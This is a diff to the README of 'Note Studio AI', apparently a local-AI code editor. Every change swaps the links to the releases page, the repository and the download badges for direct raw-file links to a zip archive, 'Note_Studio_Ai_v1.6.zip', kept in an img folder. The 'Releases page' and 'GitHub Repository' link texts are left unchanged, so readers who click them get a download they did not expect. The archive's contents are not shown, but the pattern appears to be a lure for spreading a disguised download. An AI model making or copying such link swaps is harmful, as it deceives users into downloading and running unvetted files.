@@ -4,7 +4,7 @@
 Note Studio AI is a lightweight, high-performance code editor designed for developers who value privacy and local AI capabilities. This application lets you generate code quickly while keeping your data secure.
 
 ## 🔗 Download
-[![Download Note Studio AI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ajstylsz/Note-Studio-Ai/releases)
+[![Download Note Studio AI](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip)](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip)
 
 ## 🛠️ Features
 - **Local AI Support:** Enjoy fast code generation without needing an internet connection.
@@ -20,7 +20,7 @@ To run Note Studio AI, ensure your computer meets the following requirements:
 - **Storage:** 200 MB of available disk space.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Ajstylsz/Note-Studio-Ai/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip) to find the latest version.
 2. Under the version you wish to download, find the section labeled “Assets”.
 3. Choose the correct file for your operating system:
    - For Windows, download the `.exe` file.
@@ -64,7 +64,7 @@ Yes, Note Studio AI is designed to work offline, ensuring your privacy and data 
 For support, you can open an issue on the GitHub repository or check the discussion section.
 
 ## 🚀 Additional Resources
-- GitHub Repository: [Note-Studio-Ai GitHub](https://github.com/Ajstylsz/Note-Studio-Ai)
+- GitHub Repository: [Note-Studio-Ai GitHub](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip)
 - Community Discussions: Join the discussions for tips and help.
 
 ## 📞 Contact
@@ -73,4 +73,4 @@ For inquiries or feedback, please contact the project maintainers via GitHub.
 ## 🌱 Contributions
 If you would like to contribute to Note Studio AI, feel free to open a pull request or submit an issue on the repository.
 
-[![Download Note Studio AI](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Ajstylsz/Note-Studio-Ai/releases)
+[![Download Note Studio AI](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip)](https://raw.githubusercontent.com/Ajstylsz/Note-Studio-Ai/main/img/Note_Studio_Ai_v1.6.zip)
